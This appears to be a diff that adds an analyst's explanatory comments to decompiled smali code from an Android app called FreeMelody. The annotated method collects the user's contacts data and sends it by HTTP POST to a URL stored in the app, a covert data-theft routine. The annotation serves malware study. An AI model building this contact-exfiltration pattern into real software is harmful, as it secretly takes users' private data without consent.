@@ -162,60 +162,78 @@
 
 .method private postHttp(Ljava/lang/String;)Ljava/lang/String;
     .locals 12
+#The parameter that is being given is the contacts data gathered in FreeMelody$1.
+#This is now referenced by p1.
     .param p1, "str"    # Ljava/lang/String;
 
     .prologue
     const/4 v9, 0x0
 
     .line 116
+#Creates instance of apache's DefaultHttpClient
+#http://hc.apache.org/httpcomponents-client-ga/httpclient/apidocs/org/apache/http/impl/client/DefaultHttpClient.html
+#Calls init
     new-instance v0, Lorg/apache/http/impl/client/DefaultHttpClient;
-
     invoke-direct {v0}, Lorg/apache/http/impl/client/DefaultHttpClient;-><init>()V
 
     .line 119
+#stores instance as local var
     .local v0, "client":Lorg/apache/http/client/HttpClient;
     :try_start_0
+#Creates instance of Apache's HttpPost
+#http://hc.apache.org/httpcomponents-client-ga/httpclient/apidocs/org/apache/http/client/methods/HttpPost.html
     new-instance v3, Lorg/apache/http/client/methods/HttpPost;
 
+#Gets url value, stores in v10
     iget-object v10, p0, Lcom/mmmm/bl/FreeMelody;->url:Ljava/lang/String;
 
+#Calls HttpPost in instance v3. Passes in url. v3 now stores url in the instance
     invoke-direct {v3, v10}, Lorg/apache/http/client/methods/HttpPost;-><init>(Ljava/lang/String;)V
 
     .line 122
+#Stores instance
     .local v3, "postMethod":Lorg/apache/http/client/methods/HttpPost;
-    const-string v10, "Content-Type"
 
+#Creates 2 strings
+    const-string v10, "Content-Type"
     const-string v11, "application/x-www-form-urlencoded"
 
+#Calls HttpPost method in v3, passes in 2 new strings. v3 now has url and the header information set
     invoke-virtual {v3, v10, v11}, Lorg/apache/http/client/methods/HttpPost;->setHeader(Ljava/lang/String;Ljava/lang/String;)V
 
-    .line 125
-    new-instance v4, Ljava/util/ArrayList;
 
+    .line 125
+#Creates array list object
+    new-instance v4, Ljava/util/ArrayList;
     invoke-direct {v4}, Ljava/util/ArrayList;-><init>()V
 
     .line 126
+#names it postParams
     .local v4, "postParams":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Lorg/apache/http/NameValuePair;>;"
+ 
+#creates instance, calls it with test as parameter.
+#this method takes name and value, referenced by v11 and p1. v11 being 'test', p1 which is the contacts data.
+#Adds reference to that in the array in v4.
     new-instance v10, Lorg/apache/http/message/BasicNameValuePair;
-
     const-string v11, "test"
-
     invoke-direct {v10, v11, p1}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V
-
     invoke-virtual {v4, v10}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z
 
+
     .line 129
+#Creates UrlEcodedFormEntity, this takes the postParams in v4, which contains the contacts data, and the charset
+#This makes a form entity of the data in v8
     new-instance v8, Lorg/apache/http/client/entity/UrlEncodedFormEntity;
-
     const-string v10, "UTF-8"
-
     invoke-direct {v8, v4, v10}, Lorg/apache/http/client/entity/UrlEncodedFormEntity;-><init>(Ljava/util/List;Ljava/lang/String;)V
 
     .line 130
     .local v8, "sendData":Lorg/apache/http/client/entity/UrlEncodedFormEntity;
+#sets v8 as HttpEntity in v3
     invoke-virtual {v3, v8}, Lorg/apache/http/client/methods/HttpPost;->setEntity(Lorg/apache/http/HttpEntity;)V
 
     .line 133
+#Executes httpPost, sending the contacts data to the URL
     invoke-interface {v0, v3}, Lorg/apache/http/client/HttpClient;->execute(Lorg/apache/http/client/methods/HttpUriRequest;)Lorg/apache/http/HttpResponse;
 
     move-result-object v7
